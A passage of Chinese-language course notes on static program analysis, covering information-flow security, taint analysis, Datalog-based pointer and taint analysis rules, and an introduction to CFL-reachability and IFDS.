          <a href="#2-Confidentiality-and-Integrity" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Confidentiality-and-Integrity" class="headerlink" title="2.Confidentiality and Integrity"></a>2.Confidentiality and Integrity</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304120447356.png" alt="image-20230304120447356"></p>
<p>两者所防御的点不一样，一个像<code>Confidentiality</code>读保护，一个像<code>Integrity</code>写保护</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304121014989.png" alt="image-20230304121014989"></p>

        <h3 id="Integrity"   >
          <a href="#Integrity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Integrity" class="headerlink" title="Integrity"></a>Integrity</h3>
      <p>保护数据的完整性</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304120820220.png" alt="image-20230304120820220"></p>
<p>即防止不可信的数据影响到本地的相关数据程序。</p>
<p>此外还有更加广泛的定义</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304121346571.png" alt="image-20230304121346571"></p>
<p>即数据的<code>Completeness</code>完整性、<code>Correctness</code>准确性、<code>Consistency</code>一致性都是在<code>Integrity</code>的定义下。</p>

        <h3 id="Confidentialityt"   >
          <a href="#Confidentialityt" class="heading-link"><i class="fas fa-link"></i></a><a href="#Confidentialityt" class="headerlink" title="Confidentialityt"></a>Confidentialityt</h3>
      <p>保护数据的保密性，即数据不被泄露。</p>

        <h2 id="3-Explicit-Flows-and-Covert-Channels"   >
          <a href="#3-Explicit-Flows-and-Covert-Channels" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Explicit-Flows-and-Covert-Channels" class="headerlink" title="3.Explicit Flows and Covert Channels"></a>3.Explicit Flows and Covert Channels</h2>
      
        <h3 id="Implicit-Flows"   >
          <a href="#Implicit-Flows" class="heading-link"><i class="fas fa-link"></i></a><a href="#Implicit-Flows" class="headerlink" title="Implicit Flows"></a>Implicit Flows</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304122132934.png" alt="image-20230304122132934"></p>
<p>可以通过判断<code>public_L</code>的值，判断出<code>secret_H</code>的信息，即<code>Implicit Flows</code>隐式流。</p>

        <h4 id="更多例子"   >
          <a href="#更多例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#更多例子" class="headerlink" title="更多例子"></a>更多例子</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304122422841.png" alt="image-20230304122422841"></p>
<p>上述的各个语句，都可以通过特定的情形判断出<code>secret_H</code>的相关信息</p>

        <h3 id="Covert-Hidden-Channels"   >
          <a href="#Covert-Hidden-Channels" class="heading-link"><i class="fas fa-link"></i></a><a href="#Covert-Hidden-Channels" class="headerlink" title="Covert/Hidden Channels"></a>Covert/Hidden Channels</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304143310016.png" alt="image-20230304143310016"></p>
<ul>
<li><code>channels</code> : 通过计算来传递信息的机制称为<code>Channels</code>信道</li>
<li><code>Covert Channels</code> : 一个主要目的不是信息传递的信道，但是该信道仍然将信息传递出来了，那么这个信道被称为<code>Covert Channels</code>隐藏信道</li>
</ul>
<p>以上提到的一些信道其实都是这里定义的<code>Covert Channels</code>，都会传递出一定的信息，有点像一些侧信道攻击。</p>

        <h3 id="Explicit-Flows"   >
          <a href="#Explicit-Flows" class="heading-link"><i class="fas fa-link"></i></a><a href="#Explicit-Flows" class="headerlink" title="Explicit Flows"></a>Explicit Flows</h3>
      <p>那么相对于<code>Implicit Flows</code>隐藏信道的就是<code>Explicit Flows</code>显式信道，会传递出更多的信息，如下例子所示。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304143704679.png" alt="image-20230304143704679"></p>

        <h2 id="4-Taint-Analysis"   >
          <a href="#4-Taint-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Taint-Analysis" class="headerlink" title="4.Taint Analysis"></a>4.Taint Analysis</h2>
      <p>针对关心的数据打上标记称为<code>Tainted data</code>，那么依据该数据的源头<code>Source</code>进行分析，尝试寻找<code>tained data</code>是否会流到某个敏感点<code>sink</code>，比如常见的<code>system</code>函数。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304144526463.png" alt="image-20230304144526463"></p>
<p>课程中老师讲到如下的一些例子，类似的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304144635715.png" alt="image-20230304144635715"></p>

        <h3 id="Taint-and-Pointer-Analysis"   >
          <a href="#Taint-and-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#Taint-and-Pointer-Analysis" class="headerlink" title="Taint and Pointer Analysis"></a>Taint and Pointer Analysis</h3>
      <p>可以将指针分析和污点分析相结合，<code>Tainted data</code>污点数据作为一个指针对象，<code>sources</code>作为<code>allocation sites</code>，然后用指针分析来传播<code>tainted data</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304150023175.png" alt="image-20230304150023175"></p>

        <h3 id="Domains-and-Notations"   >
          <a href="#Domains-and-Notations" class="heading-link"><i class="fas fa-link"></i></a><a href="#Domains-and-Notations" class="headerlink" title="Domains and Notations"></a>Domains and Notations</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304151238672.png" alt="image-20230304151238672"></p>
<p>加入了一个污点数据定义，包含在之前的对象集合中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304151544492.png" alt="image-20230304151544492"></p>
<p>感兴趣的创建对象点为<code>Sources</code>，敏感方法为<code>Sinks</code>，最终可以输出一个<code>pair</code>，<code>&lt;i,j,k&gt;</code>表示从<code>source_i</code>的污点数据可能会流到<code>k</code>个参数的<code>call_site_j</code>这个<code>sink</code>方法中。</p>

        <h3 id="Rules-1"   >
          <a href="#Rules-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules-1" class="headerlink" title="Rules"></a>Rules</h3>
      
        <h4 id="Rules-Sources"   >
          <a href="#Rules-Sources" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules-Sources" class="headerlink" title="Rules:Sources"></a>Rules:Sources</h4>
      <p>处理<code>Sources</code>的方法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304152043659.png" alt="image-20230304152043659"></p>
<p>即在指针分析的<code>call</code>时，某个调用点会调用到属于<code>Sources</code>的方法<code>m</code>，那么就会创建一个<code>t_l</code>污点数据放入该方法返回值的指针集<code>pt(r)</code>里面。</p>

        <h4 id="Rules-Propagate"   >
          <a href="#Rules-Propagate" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules-Propagate" class="headerlink" title="Rules:Propagate"></a>Rules:Propagate</h4>
      <p>传播的过程和指针分析类似，因为污点数据其实就是一个对象集合。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304152545326.png" alt="image-20230304152545326"></p>

        <h4 id="Rules-sink"   >
          <a href="#Rules-sink" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules-sink" class="headerlink" title="Rules:sink"></a>Rules:sink</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304152630082.png" alt="image-20230304152630082"></p>
<p>当某个点调用到属于<code>Sinks</code>的方法时，如果方法调用参数中包含污点数据，那么就会将一个<code>pair&lt;j,l,i&gt;</code>加入到<code>TaintFlows</code>中方便后面进行输出。</p>

        <h3 id="实例-6"   >
          <a href="#实例-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例-6" class="headerlink" title="实例"></a>实例</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304153919785.png" alt="image-20230304153919785"></p>
<p>首先是污点分析的<code>tainted data</code>的创建，这里就是<code>t3</code>加入到<code>pt(pw)</code>，然后就会随着<code>pt(pw)</code>一直流动到<code>s</code>中，直到调用到<code>sink</code>点时，检测到传入的参数中包含<code>pt(pw)</code>这个<code>tainted data</code>，就可以加入到<code>TaintFlows</code>了。</p>
<p>其中<code>&lt;3,7,0&gt;</code>代表在<code>3</code>处的<code>tainted data</code>会流向到<code>7</code>处的<code>sink</code>，参数位置为第<code>0</code>个参数。</p>

        <h2 id="总结-7"   >
          <a href="#总结-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-7" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304154401211.png" alt="image-20230304154401211"></p>
<p>信息流安全的概念，信息的完整性和保密性，显式和隐式的信道，以及污点分析的相关使用。</p>

        <h1 id="十三、Datalog-Based-Program-Analysis"   >
          <a href="#十三、Datalog-Based-Program-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#十三、Datalog-Based-Program-Analysis" class="headerlink" title="十三、Datalog-Based Program Analysis"></a>十三、Datalog-Based Program Analysis</h1>
      <p>基于<code>Datalog</code>来进行程序分析</p>

        <h2 id="1-Motivation-2"   >
          <a href="#1-Motivation-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Motivation-2" class="headerlink" title="1.Motivation"></a>1.Motivation</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304155559173.png" alt="image-20230304155559173"></p>
<ul>
<li><p><code>Imperative</code>命令式语言</p>
<p>告诉计算机怎么做，类似<code>C</code>语言</p>
</li>
<li><p><code>Declarative</code>声明式语言</p>
<p>告诉计算机要做什么，类似<code>SQL</code>语言</p>
</li>
</ul>

        <h3 id="Pointer-Analysis-Imperative-Implementation"   >
          <a href="#Pointer-Analysis-Imperative-Implementation" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pointer-Analysis-Imperative-Implementation" class="headerlink" title="Pointer Analysis, Imperative  Implementation"></a>Pointer Analysis, Imperative  Implementation</h3>
      <ul>
<li><code>worklist</code>：<ul>
<li><code>Array/list</code>？</li>
<li>先进先出吗？</li>
</ul>
</li>
<li><code>points-to set(pt)</code>：<ul>
<li><code>Hash/vector</code>？</li>
</ul>
</li>
<li><code>PFG nodes</code>：<ul>
<li>变量和节点的关联</li>
</ul>
</li>
<li><code>variables and relevant statements</code>变量和相关语句的关联</li>
</ul>

        <h3 id="Pointer-Analysis-Declarative-Implementation-via-Datalog"   >
          <a href="#Pointer-Analysis-Declarative-Implementation-via-Datalog" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pointer-Analysis-Declarative-Implementation-via-Datalog" class="headerlink" title="Pointer Analysis, Declarative  Implementation (via Datalog)"></a>Pointer Analysis, Declarative  Implementation (via Datalog)</h3>
      <p>通过<code>Datalog</code>来实现指针分析比较好实现</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304160203485.png" alt="image-20230304160203485"></p>

        <h2 id="2-Introduction-to-Datalog"   >
          <a href="#2-Introduction-to-Datalog" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Introduction-to-Datalog" class="headerlink" title="2.Introduction to Datalog"></a>2.Introduction to Datalog</h2>
      <p><code>Datalog = Data + Logic</code></p>
<p>最开始是从数据查询语言发展而来</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304160546783.png" alt="image-20230304160546783"></p>

        <h3 id="Predicates-Data"   >
          <a href="#Predicates-Data" class="heading-link"><i class="fas fa-link"></i></a><a href="#Predicates-Data" class="headerlink" title="Predicates(Data)"></a>Predicates(Data)</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304160824947.png" alt="image-20230304160824947"></p>
<p>这张表中，<code>Predicates</code>谓词即为<code>Age</code>，某个<code>Statements</code>在表中即为<code>fact</code>，不在就不是<code>fact</code>。</p>

        <h3 id="Atoms"   >
          <a href="#Atoms" class="heading-link"><i class="fas fa-link"></i></a><a href="#Atoms" class="headerlink" title="Atoms"></a>Atoms</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304161051316.png" alt="image-20230304161051316"></p>
<p><code>Atoms</code>在<code>Datalog</code>语言中是最小的语句，形式如同<code>Age(&quot;Xiaoming&quot;,18)</code></p>

        <h4 id="relational-atom"   >
          <a href="#relational-atom" class="heading-link"><i class="fas fa-link"></i></a><a href="#relational-atom" class="headerlink" title="relational atom"></a>relational atom</h4>
      <p>形如<code>P(X1,X2,…,Xn)</code>被称为关系型<code>Atoms</code>，比如<code>Age(“Xiaoming”,18)</code>，代表一种关系。</p>

        <h3 id="Rules-2"   >
          <a href="#Rules-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules-2" class="headerlink" title="Rules"></a>Rules</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311103310452.png" alt="image-20230311103310452"></p>
<p>感觉就是通过数据<code>Facts</code>，然后给定规则<code>Rules</code>，最后得到一个结果<code>Datalog program</code></p>

        <h3 id="EDB-and-IDB-Predicates"   >
          <a href="#EDB-and-IDB-Predicates" class="heading-link"><i class="fas fa-link"></i></a><a href="#EDB-and-IDB-Predicates" class="headerlink" title="EDB and IDB Predicates"></a>EDB and IDB Predicates</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311105116933.png" alt="image-20230311105116933"></p>
<p>这里不是很懂这两个数据库的概念，后面再来看看把，其中<code>EDB</code>是不能修改的。</p>

        <h3 id="Logical-Or"   >
          <a href="#Logical-Or" class="heading-link"><i class="fas fa-link"></i></a><a href="#Logical-Or" class="headerlink" title="Logical Or"></a>Logical Or</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311104245405.png" alt="image-20230311104245405"></p>
<p>逻辑<code>or</code>的操作符为<code>;</code>，运算优先级小于逻辑<code>and</code>。</p>

        <h3 id="Negation"   >
          <a href="#Negation" class="heading-link"><i class="fas fa-link"></i></a><a href="#Negation" class="headerlink" title="Negation"></a>Negation</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311104418530.png" alt="image-20230311104418530"></p>
<p>逻辑非的运算符<code>!</code>，类似的。</p>

        <h3 id="Recursion"   >
          <a href="#Recursion" class="heading-link"><i class="fas fa-link"></i></a><a href="#Recursion" class="headerlink" title="Recursion"></a>Recursion</h3>
      <p>递归的性质</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311105157450.png" alt="image-20230311105157450"></p>
<p>即某个<code>IDB</code>某些数据加上一些东西也可以推导出该<code>IDB</code>的某些数据，就有一个递归在里面。</p>
<p>正是有了递归使得<code>Datalog</code>变得更加丰富，不再像只是简单查询的类似<code>SQL</code>的语言。</p>

        <h3 id="Rule-Safety"   >
          <a href="#Rule-Safety" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Safety" class="headerlink" title="Rule Safety"></a>Rule Safety</h3>
      <p>在<code>Datalog</code>中的<code>rule</code>存在<code>safe</code>的概念</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311105839092.png" alt="image-20230311105839092"></p>
<p>比如上述图片提到的例子，<code>x&gt;y</code>中的<code>x</code>是无穷的，<code>!C(x,y)</code>的元素也是无穷的，这样的就是<code>unsafe</code>的。</p>
<p>一个<code>safe Rule</code>中的所有变量都只能出现在<code>non-negated</code>，即不是否定<code>!</code>的关系<code>Atom</code>中。</p>
<p>在<code>Datalog</code>中只有<code>safe rule</code>可被允许。</p>

        <h3 id="Recursion-and-Negation"   >
          <a href="#Recursion-and-Negation" class="heading-link"><i class="fas fa-link"></i></a><a href="#Recursion-and-Negation" class="headerlink" title="Recursion and Negation"></a>Recursion and Negation</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311111635015.png" alt="image-20230311111635015"></p>
<p>这种没有意义的规则是不能写的，没有含义，<code>Datalog</code>也不会允许。</p>

        <h3 id="Execution-of-Datalog-Programs"   >
          <a href="#Execution-of-Datalog-Programs" class="heading-link"><i class="fas fa-link"></i></a><a href="#Execution-of-Datalog-Programs" class="headerlink" title="Execution of Datalog Programs"></a>Execution of Datalog Programs</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311112053774.png" alt="image-20230311112053774"></p>
<p>不同的语言引擎其规则大同小异</p>
<p><code>Datalog</code>具有单调性，其<code>Facts</code>只会单调递增，并且<code>Datalog</code>程序一定会终止，因为其<code>Monotonicity</code>单调性以及<code>safe rulety</code>。</p>

        <h2 id="3-Pointer-Analysis-via-Datalog"   >
          <a href="#3-Pointer-Analysis-via-Datalog" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Pointer-Analysis-via-Datalog" class="headerlink" title="3.Pointer Analysis via Datalog"></a>3.Pointer Analysis via Datalog</h2>
      
        <h3 id="相关概念"   >
          <a href="#相关概念" class="heading-link"><i class="fas fa-link"></i></a><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3>
      
        <h4 id="EDB"   >
          <a href="#EDB" class="heading-link"><i class="fas fa-link"></i></a><a href="#EDB" class="headerlink" title="EDB"></a>EDB</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311112346195.png" alt="image-20230311112346195"></p>
<ul>
<li><code>EDB</code>：能直接从程序中得到的关系数据库，比如<code>New、Assign</code>等等</li>
<li><code>IDB</code>：最终的指针分析结果</li>
<li><code>Rules</code>：指针分析设定的规则</li>
</ul>
<p>比如如下的情况</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311112601320.png" alt="image-20230311112601320"></p>

        <h4 id="Rules-3"   >
          <a href="#Rules-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules-3" class="headerlink" title="Rules"></a>Rules</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311113933344.png" alt="image-20230311113933344"></p>
<p>基本都是一一对应的，对应理解就好</p>

        <h4 id="Call"   >
          <a href="#Call" class="heading-link"><i class="fas fa-link"></i></a><a href="#Call" class="headerlink" title="Call"></a>Call</h4>
      <p>分为几个部分一一对应</p>

        <h5 id="one"   >
          <a href="#one" class="heading-link"><i class="fas fa-link"></i></a><a href="#one" class="headerlink" title="one"></a>one</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311141910814.png" alt="image-20230311141910814"></p>
<ul>
<li><code>VCall(l:S,x:V,k:M)</code> : 代表<code>l</code>语句下调用<code>x.k(..)</code></li>
<li><code>Dispatch(o:O,k:M,m:M)</code> : 和之前一样的，找到对应函数<code>m</code></li>
<li><code>ThisVar(m:M,this:V)</code> : 代表获取<code>this</code>变量</li>
<li><code>Reachable(m:M)</code> : 代表添加可达方法<code>m</code></li>
<li><code>CallGraph(l:S,m:M)</code> : 代表 <code>l</code>语句调用到函数<code>m</code>，正常的<code>CG</code></li>
</ul>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oi∈ pt(x),m = Dispatch(Oi, k) ---&gt; Oi∈ pt(M_this)</span><br></pre></td></tr></table></div></figure>

<p>即该条件转化为<code>Datalog</code>为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VarPointsTo(this, o),Reachable(m),CallGraph(l, m) &lt;-VCall(l, x, k),VarPointsTo(x, o),Dispatch(o, k, m),ThisVar(m, this).</span><br></pre></td></tr></table></div></figure>


        <h5 id="two"   >
          <a href="#two" class="heading-link"><i class="fas fa-link"></i></a><a href="#two" class="headerlink" title="two"></a>two</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311152853949.png" alt="image-20230311152853949"></p>
<ul>
<li><code>Argument(l:S,i:N,ai:V)</code> : 代表实参，即调用点的实参表示，调用点<code>l</code>的<code>ai</code>参数</li>
<li><code>Parameter(m:M,i:N,pi:V)</code> : 代表函数中的形参，函数中的<code>pi</code>参数。</li>
</ul>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ou∈pt(aj),1≤j≤n  ---&gt; Ou∈pt(m_pj),1≤j≤n</span><br></pre></td></tr></table></div></figure>

<p>对应参数的传递，转化为<code>Datalog</code>即为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VarPointsTo(pi,o) &lt;- CallGraph(l,m),Argument(l, i,ai),Parameter(m,i,pi),VarPointsTo(ai,o).</span><br></pre></td></tr></table></div></figure>


        <h5 id="three"   >
          <a href="#three" class="heading-link"><i class="fas fa-link"></i></a><a href="#three" class="headerlink" title="three"></a>three</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311153437690.png" alt="image-20230311153437690"></p>
<ul>
<li><code>MethodReturn(m:M,ret:V)</code> : 代表返回值，即函数<code>m</code>中的返回值<code>ret</code></li>
<li><code>CallReturn(l:S,r:V)</code> : 代表调用点<code>l</code>接收返回值到<code>r</code></li>
</ul>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ov∈pt(m_ret)  ---&gt;  Ov∈pt(r)</span><br></pre></td></tr></table></div></figure>

<p>对应返回值的传递，转化为<code>Datalog</code>即为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VarPointsTo(r, o) &lt;- CallGraph(l, m),MethodReturn(m, ret),VarPointsTo(ret, o),CallReturn(l, r).</span><br></pre></td></tr></table></div></figure>

<p>最终结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311154015447.png" alt="aaaaa"></p>

        <h3 id="实例-7"   >
          <a href="#实例-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例-7" class="headerlink" title="实例"></a>实例</h3>
      
        <h4 id="EDB-1"   >
          <a href="#EDB-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#EDB-1" class="headerlink" title="EDB"></a>EDB</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311113001636.png" alt="image-20230311113001636"></p>
<p>依据上述的例子能大概推导出相关的<code>EDB</code>了。</p>

        <h4 id="Rules-4"   >
          <a href="#Rules-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules-4" class="headerlink" title="Rules"></a>Rules</h4>
      <p>依据规则进行一一解析即可求得</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311114532642.png" alt="image-20230311114532642"></p>

        <h4 id="Whole-Program-Pointer-Analysis"   >
          <a href="#Whole-Program-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#Whole-Program-Pointer-Analysis" class="headerlink" title="Whole-Program Pointer Analysis"></a>Whole-Program Pointer Analysis</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311154150284.png" alt="image-20230311154150284"></p>
<p>处理<code>New</code>方法时，会限定在<code>reachable</code>方法中</p>

        <h2 id="4-Taint-Analysis-via-Datalog"   >
          <a href="#4-Taint-Analysis-via-Datalog" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Taint-Analysis-via-Datalog" class="headerlink" title="4.Taint Analysis via Datalog"></a>4.Taint Analysis via Datalog</h2>
      
        <h3 id="相关概念-1"   >
          <a href="#相关概念-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#相关概念-1" class="headerlink" title="相关概念"></a>相关概念</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230311154838944.png" alt="image-20230311154838944"></p>
<p>主要是<code>Taint(l:S,t:T)</code>的解释，把所有的污点数据产生点<code>call site</code>，即<code>l:S</code>关联到产生的污点数据<code>tainted data</code>，即<code>t:T</code>。<code>TaintFlow</code>差不多是相同的。</p>

        <h4 id="source-sink"   >
          <a href="#source-sink" class="heading-link"><i class="fas fa-link"></i></a><a href="#source-sink" class="headerlink" title="source/sink"></a>source/sink</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314102251546.png" alt="image-20230314102251546"></p>
<p>同样是一一对应的关系，即在指针分析中加入这个污点分析即可。</p>

        <h3 id="优缺点"   >
          <a href="#优缺点" class="heading-link"><i class="fas fa-link"></i></a><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314103528905.png" alt="image-20230314103528905"></p>

        <h4 id="优点Pros"   >
          <a href="#优点Pros" class="heading-link"><i class="fas fa-link"></i></a><a href="#优点Pros" class="headerlink" title="优点Pros"></a>优点Pros</h4>
      <p>比较整洁，容易实现，更容易基于现成的引擎优化进行改造</p>

        <h4 id="缺点Cons"   >
          <a href="#缺点Cons" class="heading-link"><i class="fas fa-link"></i></a><a href="#缺点Cons" class="headerlink" title="缺点Cons"></a>缺点Cons</h4>
      <p>因为<code>Datalog</code>的一些限制，导致其表达方式比较少，某些逻辑可能不能表达到位，比如一些<code>for-all</code>的情况等。此外<code>Datalog</code>因为大多基于一些引擎，导致其不能很好地控制性能。</p>

        <h2 id="总结-8"   >
          <a href="#总结-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-8" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314104032554.png" alt="image-20230314104032554"></p>
<p>了解<code>Datalog</code>语言，学会通过<code>Datalog</code>实现指针分析、污点分析。</p>

        <h1 id="十四、CFL-Reachability-and-IFDS"   >
          <a href="#十四、CFL-Reachability-and-IFDS" class="heading-link"><i class="fas fa-link"></i></a><a href="#十四、CFL-Reachability-and-IFDS" class="headerlink" title="十四、CFL-Reachability and IFDS"></a>十四、CFL-Reachability and IFDS</h1>
      
        <h2 id="1-Feasible-and-Realizable-Paths"   >
          <a href="#1-Feasible-and-Realizable-Paths" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Feasible-and-Realizable-Paths" class="headerlink" title="1.Feasible and Realizable Paths"></a>1.Feasible and Realizable Paths</h2>
      
        <h3 id="Infeasible-Paths"   >
          <a href="#Infeasible-Paths" class="heading-link"><i class="fas fa-link"></i></a><a href="#Infeasible-Paths" class="headerlink" title="Infeasible Paths:"></a>Infeasible Paths:</h3>
      <p><code>CFG</code>中在程序运行起来并不执行的路径</p>

        <h3 id="Realizable-Paths"   >
          <a href="#Realizable-Paths" class="heading-link"><i class="fas fa-link"></i></a><a href="#Realizable-Paths" class="headerlink" title="Realizable Paths:"></a>Realizable Paths:</h3>
      <p><code>call</code>和<code>return</code>相匹配的路径，即分析的时候不会依据函数传递到其他的变量，如下的调用点<code>1</code>和调用点<code>2</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314145313166.png" alt="image-20230314145313166"></p>
<p>但是<code>Readlizabale path</code>其实也可能不被执行，因为可能该<code>Readlizabale path</code>的调用点是在<code>Infeasible Paths</code>中。另外<code>unrealizable paths</code>一定不会被执行。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314145241336.png" alt="image-20230314145241336"></p>

        <h2 id="2-CFL-Reachability"   >
          <a href="#2-CFL-Reachability" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-CFL-Reachability" class="headerlink" title="2.CFL-Reachability"></a>2.CFL-Reachability</h2>
      <p>一条<code>A</code>到<code>B</code>的路径中所有的边都有一个<code>label</code>，这个<code>lable</code>只能由确定的规则<code>context-free language</code>来定义</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314145614781.png" alt="image-20230314145614781"></p>
<ul>
<li><p><code>context-free language</code> : 遵循<code>context-free grammar(CFG)</code>的语言</p>
</li>
<li><p><code>context-free grammar(CFG)</code> : </p>
<p>有点不理解，<code>Mark</code>一下</p>
</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314193506350.png" alt="image-20230314193506350"></p>
<p>感觉就是一个加了标签的括号匹配算法，满足这个情况即是<code>realizable</code></p>

        <h2 id="3-Overview-of-IFDS"   >
          <a href="#3-Overview-of-IFDS" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Overview-of-IFDS" class="headerlink" title="3.Overview of IFDS"></a>3.Overview of IFDS</h2>
      
        <h3 id="概念-1"   >
          <a href="#概念-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314202708702.png" alt="image-20230314202708702"></p>
<p>在过程间数据流分析中，如果一个<code>f</code>是可分配<code>distributive</code>，并且其<code>domains</code>是<code>finite</code>的，那么就可以用<code>IFDS</code></p>

        <h3 id="Meet-Over-All-Realizable-Paths-MRP"   >
          <a href="#Meet-Over-All-Realizable-Paths-MRP" class="heading-link"><i class="fas fa-link"></i></a><a href="#Meet-Over-All-Realizable-Paths-MRP" class="headerlink" title="Meet-Over-All-Realizable-Paths (MRP)"></a>Meet-Over-All-Realizable-Paths (MRP)</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230314203137454.png" alt="image-20230314203137454"></p>
<p>即在<code>realizable paths</code>上做<code>MOP</code>分析，更加准确</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316101950460.png" alt="image-20230316101950460"></p>
<p>这里属实听得不太懂</p>

